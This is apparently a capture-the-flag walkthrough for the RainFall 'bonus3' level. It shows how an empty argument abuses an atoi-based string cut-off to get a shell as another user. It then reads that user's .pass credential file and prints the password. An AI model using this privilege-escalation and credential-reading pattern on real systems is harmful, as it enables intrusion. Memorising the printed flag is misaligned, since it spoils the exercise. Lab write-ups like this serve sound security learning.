We see here that to have a shell, we just need that the strcmp between the content of the .pass and our first argument are the same.
There is just one tweak that has been done to the content of `/home/user/end/.pass` :

```c
		iVar2 = atoi(argv[1]);
		*(undefined *)((int)local_98 + iVar2) = 0;

```

Basically, we can choose where the string will end, so when the strcmp will end.
The trick here is that `atoi("")` return 0.
By doing so, local_98 will became `\x00flag`, so when use as a string : only `""` :

>bonus3@RainFall:~$ ./bonus3 ""
>$ whoami
>end
>$ cat /home/user/end
>cat: /home/user/end: Is a directory
>$             
>bonus3@RainFall:~$ ./bonus3 ""
>$ whoami
>end
>$ cat /home/user/end/.pass
>3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c

```bash
su end
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```

